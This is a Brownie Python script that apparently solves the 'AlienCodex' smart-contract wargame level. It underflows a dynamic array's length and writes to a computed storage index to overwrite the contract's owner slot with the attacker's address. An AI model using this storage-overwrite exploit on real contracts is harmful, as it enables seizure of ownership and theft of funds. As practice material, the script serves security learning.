from brownie import accounts, config, convert, interface, web3, AlienCodex
from eth_utils import keccak

def main(alien):
    hacker = accounts.add(config['wallets']['from_key'])
    target = interface.AlienCodexInterface(alien)
    print(f'Owner: {target.owner()}')
    target.make_contact({'from': hacker})
    # First we want array to use all space
    target.retract({'from': hacker})
    array_size = web3.eth.get_storage_at(target.address, 1).hex()
    print(f'Storage size: {convert.to_uint(array_size)}')
    # First element of our array should be located at:
    first_position = convert.to_uint(keccak(convert.to_bytes(1)))
    # 2 ** 256 max storage pointer for the dynamic array
    zero_position = 2 ** 256 - first_position
    target.revise(zero_position, hacker.address, {'from': hacker})
    print(f'New owner: {target.owner()}')
 